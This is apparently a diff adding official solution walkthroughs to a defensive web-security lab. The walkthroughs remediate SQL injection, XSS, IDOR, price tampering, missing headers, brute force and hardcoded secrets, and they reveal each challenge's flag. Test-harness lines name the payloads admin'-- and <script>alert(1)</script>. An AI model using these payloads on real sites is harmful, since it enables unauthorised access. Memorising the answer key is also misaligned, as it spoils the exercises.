+      <li>Open the in-browser code editor in the Forge interface.</li><li>Locate the login route handler in <code>/app/server.js</code> (around line 45).</li><li>Identify the vulnerable string concatenation: <code>const q = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`</code>.</li><li>Replace raw string interpolation with a prepared statement using parameter placeholders: <code>const row = db.prepare('SELECT * FROM users WHERE username = ? AND password = ?').get(username, password)</code>.</li><li>Click **Save & Run**.</li><li>The automated test harness validates that the exploit payload (<code>admin'--</code>) is blocked while legitimate credentials succeed, awarding the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>// Secure Remediation in /app/server.js:
+app.post('/portal-8f2c/login', (req, res) => {
+  const { username, password } = req.body
+  try {
+    // Prepared statement binds input as data literals, neutralizing SQL injection
+    const row = db.prepare('SELECT * FROM users WHERE username = ? AND password = ?').get(username, password)
+    if (row) return res.send(`Logged in as ${row.username}.`)
+    res.status(401).send('Bad credentials')
+  } catch (e) {
+    res.status(500).send('Query error: ' + e.message)
+  }
+})</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>db.prepare(...)</code>: Pre-compiles SQL query structure with the database engine before data values are supplied.</li><li><code>?</code>: Positional parameter placeholders. Instructs the SQLite query planner to treat bound values strictly as literal values, never as executable SQL syntax.</li><li><code>.get(username, password)</code>: Safely passes variables as bound parameters during execution.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>Test Harness Output:
+[TEST] Testing SQL Injection exploit (username="admin'--")... BLOCKED (401 Bad credentials)
+[TEST] Testing legitimate login (username="admin", password="super-secret-pw")... PASSED (200 OK)
+All criteria passed! Flag: BK{pr3p4r3d_st4t3m3nts_w1n_1a2b3c4d5e6f7a8b}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the token starting with <code>BK{pr3p4r3d_st4t3m3nts_w1n_...}</code>.</p>
+  </div>
+
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
     
@@ -1869,6 +2845,50 @@ app.get('/greeting', (req, res) => {
   res.send(`&lt;h1&gt;Welcome, ${safeName}!&lt;/h1&gt;`);
 });</code></pre>
         </div>
+
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Neutralize Reflected Cross-Site Scripting on /search in /app/server.js by implementing context-aware HTML entity encoding.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Open the in-browser code editor.</li><li>Locate the search handler in <code>/app/server.js</code> (around line 56).</li><li>Observe that <code>req.query.q</code> is reflected directly into the HTML response unescaped.</li><li>Define an HTML entity escaping helper function to convert dangerous characters (<code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code>, <code>"</code>, <code>'</code>) into safe entities.</li><li>Sanitize the query variable before HTML template interpolation: <code>const q = escapeHtml(req.query.q || '')</code>.</li><li>Click **Save & Run**.</li><li>The grader tests confirm that <code>&lt;script&gt;</code> tags are converted to safe text and releases the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>// Secure Remediation in /app/server.js:
+function escapeHtml(str) {
+  return String(str || '')
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;')
+}
+
+app.get('/search', (req, res) => {
+  const q = escapeHtml(req.query.q || '')
+  res.type('html').send(`<h1>Results for ${q}</h1><p>No products matched.</p>`)
+})</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>replace(/</g, '&lt;')</code>: Replaces < with HTML entity &lt;. The browser displays the character glyph visually without parsing it as an opening HTML element tag.</li><li><code>replace(/>/g, '&gt;')</code>: Replaces > with HTML entity &gt;, preventing HTML tag closure attacks.</li><li><code>replace(/&/g, '&amp;')</code>: Must be replaced first to avoid double-encoding entity ampersands.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>Test Harness Output:
+[TEST] Testing XSS injection query ("<script>alert(1)</script>")... BLOCKED (Rendered as &lt;script&gt;)
+[TEST] Testing legitimate query ("widget")... PASSED (200 OK)
+All criteria passed! Flag: BK{s4n1t1z3_y0ur_1nputs_2c3d4e5f6a7b8c9d}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the token starting with <code>BK{s4n1t1z3_y0ur_1nputs_...}</code>.</p>
+  </div>
 
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
@@ -1947,6 +2967,48 @@ app.get('/greeting', (req, res) => {
 });</code></pre>
         </div>
 
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Remediate Insecure Direct Object Reference on /order in /app/server.js by enforcing object-level authorization against the session cookie identity.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Open the in-browser code editor.</li><li>Locate the order retrieval handler in <code>/app/server.js</code> (around line 38).</li><li>Notice that the query retrieves the order by <code>id</code> without checking if <code>row.owner</code> belongs to the requesting client.</li><li>Add an object-level authorization check: verify that <code>row.owner === req.cookies.uid</code>. If they do not match, return <code>res.status(403).send('Forbidden')</code>.</li><li>Click **Save & Run**.</li><li>The harness verifies that accessing unowned orders is denied with HTTP 403 while legitimate owned orders succeed, releasing the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>// Secure Remediation in /app/server.js:
+app.get('/order', (req, res) => {
+  const row = db.prepare('SELECT * FROM orders WHERE id = ?').get(req.query.id)
+  if (!row) return res.status(404).send('No such order')
+  
+  // Object-Level Access Control: verify user owns the requested record
+  if (row.owner !== req.cookies.uid) {
+    return res.status(403).send('Forbidden: you do not own this order')
+  }
+
+  res.send(`Order ${row.id} (${row.owner}): ${row.item} — ${row.secret}`)
+})</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>row.owner !== req.cookies.uid</code>: Compares the owner column in the database record with the authenticated user ID stored in the session cookie.</li><li><code>res.status(403)</code>: Returns HTTP 403 Forbidden status code when authorization fails.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>Test Harness Output:
+[TEST] Requesting unowned order ID 1337 with cookie uid=alice... BLOCKED (403 Forbidden)
+[TEST] Requesting owned order ID 1042 with cookie uid=alice... PASSED (200 OK)
+All criteria passed! Flag: BK{s3ss10n_b4s3d_4uth_3d4e5f6a7b8c9d0e}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the token starting with <code>BK{s3ss10n_b4s3d_4uth_...}</code>.</p>
+  </div>
+
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
     
@@ -2023,6 +3085,48 @@ app.post('/api/checkout', (req, res) => {
 });</code></pre>
         </div>
 
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Fix client-side parameter tampering on /checkout in /app/server.js by validating that price is strictly positive and non-zero on the server.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Open the in-browser code editor.</li><li>Locate the checkout route handler in <code>/app/server.js</code> (around line 31).</li><li>Observe the flawed logic accepting <code>price &lt;= 0</code> as a free order.</li><li>Replace the bypass logic with strict input validation: ensure <code>price</code> is a valid number strictly greater than 0. If <code>!price || price &lt;= 0 || isNaN(price)</code>, reject with HTTP 400.</li><li>Click **Save & Run**.</li><li>The test harness verifies that zero/negative prices return HTTP 400 while positive prices process correctly, releasing the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>// Secure Remediation in /app/server.js:
+app.post('/checkout', (req, res) => {
+  const price = Number(req.body.price)
+  
+  // Authoritative server validation: reject manipulated or non-positive prices
+  if (!price || price <= 0 || isNaN(price)) {
+    return res.status(400).send('Invalid price parameter')
+  }
+
+  res.send(`Charged ${price}.`)
+})</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>Number(req.body.price)</code>: Explicitly casts client string input into a numeric primitive.</li><li><code>price <= 0 || isNaN(price)</code>: Enforces business invariant: checkout amounts must be strictly positive numeric values.</li><li><code>res.status(400)</code>: Returns standard HTTP 400 Bad Request client error.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>Test Harness Output:
+[TEST] Submitting checkout with price=0... BLOCKED (400 Bad Request)
+[TEST] Submitting checkout with price=-50... BLOCKED (400 Bad Request)
+[TEST] Submitting checkout with price=10... PASSED (200 OK, Charged 10)
+All criteria passed! Flag: BK{s3rv3r_v4l1d4t10n_ru13s_4e5f6a7b8c9d0e1f}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the token starting with <code>BK{s3rv3r_v4l1d4t10n_ru13s_...}</code>.</p>
+  </div>
+
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
     
@@ -2097,6 +3201,47 @@ app.use(helmet({
   frameguard: { action: 'deny' },
 }));</code></pre>
         </div>
+
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Implement defensive HTTP headers (X-Content-Type-Options: nosniff and X-Frame-Options: DENY) as global Express middleware in /app/server.js.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Open the in-browser code editor.</li><li>Locate application initialization in <code>/app/server.js</code>.</li><li>Register a global Express middleware using <code>app.use(...)</code> prior to route declarations.</li><li>Set protective response headers: <code>res.setHeader('X-Content-Type-Options', 'nosniff')</code> and <code>res.setHeader('X-Frame-Options', 'DENY')</code>, then invoke <code>next()</code>.</li><li>Click **Save & Run**.</li><li>The test harness confirms the headers are returned on all endpoints and releases the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>// Secure Remediation in /app/server.js:
+app.use((_req, res, next) => {
+  // Prevent browser MIME-type sniffing:
+  res.setHeader('X-Content-Type-Options', 'nosniff')
+  
+  // Prevent clickjacking by forbidding embedding in iframes:
+  res.setHeader('X-Frame-Options', 'DENY')
+  
+  next()
+})</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>X-Content-Type-Options: nosniff</code>: Forces modern browsers to adhere strictly to the Content-Type header declared by the server, preventing attacks where user-uploaded text is interpreted as HTML or scripts.</li><li><code>X-Frame-Options: DENY</code>: Completely disables the webpage from being rendered inside an <iframe>, preventing UI redressing and clickjacking.</li><li><code>next()</code>: Passes execution flow to the subsequent middleware or route handler.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>Test Harness Output:
+[TEST] Inspecting HTTP response headers on GET /...
+[TEST] X-Content-Type-Options: nosniff... FOUND
+[TEST] X-Frame-Options: DENY... FOUND
+All criteria passed! Flag: BK{csp_str1ct_h34d3rs_5f6a7b8c9d0e1f2a}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the token starting with <code>BK{csp_str1ct_h34d3rs_...}</code>.</p>
+  </div>
 
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
@@ -2177,6 +3322,62 @@ function rateLimiter(req, res, next) {
 app.use('/api/login', rateLimiter);</code></pre>
         </div>
 
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Mitigate credential brute-force attacks on /portal-8f2c/login by implementing sliding-window IP rate limiting in /app/server.js.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Open the in-browser code editor.</li><li>Define an in-memory attempt tracker map and a time window constant (e.g., 60 seconds): <code>const loginAttempts = new Map(); const WINDOW_MS = 60 * 1000;</code>.</li><li>Inside <code>app.post('/portal-8f2c/login', ...)</code>, extract client IP and track attempts.</li><li>If the client exceeds 10 attempts within the window, reject the request with HTTP 429: <code>return res.status(429).send('Too many attempts')</code>.</li><li>Click **Save & Run**.</li><li>The test harness fires 15 rapid login requests, verifies that request 11+ receives HTTP 429 while initial requests succeed, and releases the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>// Secure Remediation in /app/server.js:
+const loginAttempts = new Map() // ip -> { count, expiresAt }
+const WINDOW_MS = 60 * 1000
+
+app.post('/portal-8f2c/login', (req, res) => {
+  const ip = req.ip || req.connection.remoteAddress || 'client'
+  const now = Date.now()
+  const entry = loginAttempts.get(ip) || { count: 0, expiresAt: now + WINDOW_MS }
+
+  // Reset counter when time window expires
+  if (now > entry.expiresAt) {
+    entry.count = 0
+    entry.expiresAt = now + WINDOW_MS
+  }
+
+  entry.count++
+  loginAttempts.set(ip, entry)
+
+  // Block after 10 requests within the window
+  if (entry.count > 10) {
+    return res.status(429).send('Too many login attempts. Please try again later.')
+  }
+
+  const { username, password } = req.body
+  // ... proceed with authentication
+})</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>res.status(429)</code>: Standard HTTP status code 429 Too Many Requests, informing clients and rate-limit crawlers of throttling.</li><li><code>WINDOW_MS = 60 * 1000</code>: Sliding expiration window preventing permanent denial-of-service lockout for legitimate users who made typos.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>Test Harness Output:
+[TEST] Firing 10 sequential login attempts... ACCEPTED (401 Bad credentials)
+[TEST] Firing 11th login attempt... THROTTLED (429 Too Many Requests)
+All criteria passed! Flag: BK{t0k3n_buck3t_l1m1t_6a7b8c9d0e1f2a3b}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the token starting with <code>BK{t0k3n_buck3t_l1m1t_...}</code>.</p>
+  </div>
+
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
     
@@ -2245,6 +3446,44 @@ for (const secret of REQUIRED_SECRETS) {
 
 export const JWT_SECRET = process.env.JWT_SECRET;</code></pre>
         </div>
+
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Remove hardcoded secret credentials from source code in /app/server.js, reading from process.env and sanitizing public configuration endpoints.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Open the in-browser code editor.</li><li>Locate hardcoded API key declaration in <code>/app/server.js</code>: <code>const API_KEY = 'sk-hardcoded-9f83a1'</code>.</li><li>Refactor to load the secret from environment variables: <code>const API_KEY = process.env.API_KEY || ''</code>.</li><li>Locate the public configuration endpoint <code>app.get('/config', ...)</code> that prints <code>api_key=${API_KEY}</code>.</li><li>Sanitize the endpoint output so the sensitive API key is redacted: <code>res.type('text/plain').send('service=keepd\nmode=prod\n')</code>.</li><li>Click **Save & Run**.</li><li>The test harness verifies that <code>GET /config</code> no longer exposes the hardcoded secret and releases the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>// Secure Remediation in /app/server.js:
+const API_KEY = process.env.API_KEY || ''
+
+app.get('/config', (_req, res) => {
+  // Redact confidential keys from public configuration feeds
+  res.type('text/plain').send('service=keepd\nmode=prod\n')
+})</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>process.env.API_KEY</code>: Loads credentials dynamically from process execution environment (12-Factor App methodology), keeping secrets out of git commit history.</li><li><code>Redaction</code>: Removes api_key field from unauthenticated endpoint.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>Test Harness Output:
+[TEST] Querying GET /config...
+[TEST] Checking for exposure of "sk-hardcoded-9f83a1"... NOT FOUND (CLEAN)
+[TEST] Verifying service=keepd status... PASSED (200 OK)
+All criteria passed! Flag: BK{k33p_3nv_s3cr3t_7b8c9d0e1f2a3b4c}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the token starting with <code>BK{k33p_3nv_s3cr3t_...}</code>.</p>
+  </div>
 
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
@@ -2345,6 +3584,108 @@ export const JWT_SECRET = process.env.JWT_SECRET;</code></pre>
             <li><strong>Apply Holistic Fixes:</strong> Refactor all identified vulnerabilities simultaneously. Run comprehensive automated test suites to ensure security fixes do not break legitimate business functionality.</li>
           </ol>
         </div>
+
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Conduct a comprehensive code security audit of server.js and patch all 4 primary vulnerabilities (SQLi, XSS, IDOR, Price Tampering) in a single deployment.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Open the in-browser code editor containing the complete raw <code>/app/server.js</code>.</li><li>Implement all four core defensive remediations simultaneously:</li><li>1. Price Tampering (Client Trust): In <code>/checkout</code>, validate <code>!price || price &lt;= 0 || isNaN(price)</code> and return HTTP 400.</li><li>2. Insecure Direct Object Reference: In <code>/order</code>, verify <code>row.owner === req.cookies.uid</code> and return HTTP 403 on mismatch.</li><li>3. SQL Injection: In <code>/portal-8f2c/login</code>, parameterize the query with <code>db.prepare('SELECT * FROM users WHERE username = ? AND password = ?').get(username, password)</code>.</li><li>4. Reflected XSS: Define <code>escapeHtml()</code> and sanitize <code>req.query.q</code> in <code>/search</code>.</li><li>Click **Save & Run**.</li><li>The harness executes the entire multi-vector integration test suite, verifies all 4 exploits are neutralized without breaking functionality, and releases the final champion flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>// Complete Hardened Reference Implementation (/app/server.js):
+import express from 'express'
+import cookieParser from 'cookie-parser'
+import { makeDb } from './seed.js'
+
+const db = makeDb()
+const app = express()
+app.use(express.urlencoded({ extended: true }))
+app.use(express.json())
+app.use(cookieParser())
+
+// Helper: Context-aware HTML entity encoding
+function escapeHtml(str) {
+  return String(str || '')
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;')
+}
+
+app.get('/', (_req, res) => res.type('html').send('<h1>Trading Post</h1>'))
+app.get('/robots.txt', (_req, res) => res.type('text/plain').send('User-agent: *\nDisallow: /portal-8f2c/'))
+
+// FIX 1: Price Tampering (Client Trust)
+app.post('/checkout', (req, res) => {
+  const price = Number(req.body.price)
+  if (!price || price <= 0 || isNaN(price)) {
+    return res.status(400).send('Invalid price parameter')
+  }
+  res.send(`Charged ${price}.`)
+})
+
+// FIX 2: Insecure Direct Object Reference (IDOR)
+app.get('/order', (req, res) => {
+  const row = db.prepare('SELECT * FROM orders WHERE id = ?').get(req.query.id)
+  if (!row) return res.status(404).send('No such order')
+  if (row.owner !== req.cookies.uid) {
+    return res.status(403).send('Forbidden: you do not own this order')
+  }
+  res.send(`Order ${row.id} (${row.owner}): ${row.item} — ${row.secret}`)
+})
+
+// FIX 3: SQL Injection (Prepared Statements)
+app.post('/portal-8f2c/login', (req, res) => {
+  const { username, password } = req.body
+  try {
+    const row = db.prepare('SELECT * FROM users WHERE username = ? AND password = ?').get(username, password)
+    if (row) return res.send(`Logged in as ${row.username}.`)
+    res.status(401).send('Bad credentials')
+  } catch (e) {
+    res.status(500).send('Query error: ' + e.message)
+  }
+})
+
+// FIX 4: Reflected Cross-Site Scripting (Output Encoding)
+app.get('/search', (req, res) => {
+  const q = escapeHtml(req.query.q || '')
+  res.type('html').send(`<h1>Results for ${q}</h1><p>No products matched.</p>`)
+})
+
+const PORT = process.env.PORT || 8080
+if (!process.env.HARNESS) app.listen(PORT, () => console.log(`[trading-post] on :${PORT}`))
+export default app</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>Full Defense-in-Depth</code>: Combines parameterization, object authorization, strict numerical input validation, and contextual output encoding.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>Test Harness Output:
+{
+  "room": "full-review",
+  "parts": [
+    { "name": "sqli", "exploitBlocked": true, "stillWorks": true, "pass": true },
+    { "name": "xss", "exploitBlocked": true, "stillWorks": true, "pass": true },
+    { "name": "idor", "exploitBlocked": true, "stillWorks": true, "pass": true },
+    { "name": "client", "exploitBlocked": true, "stillWorks": true, "pass": true }
+  ],
+  "pass": true
+}
+All criteria passed! Flag: BK{c0d3_4ud1t_ch4mp10n_8c9d0e1f2a3b4c5d}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the master champion flag: <code>BK{c0d3_4ud1t_ch4mp10n_...}</code>.</p>
+  </div>
 
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
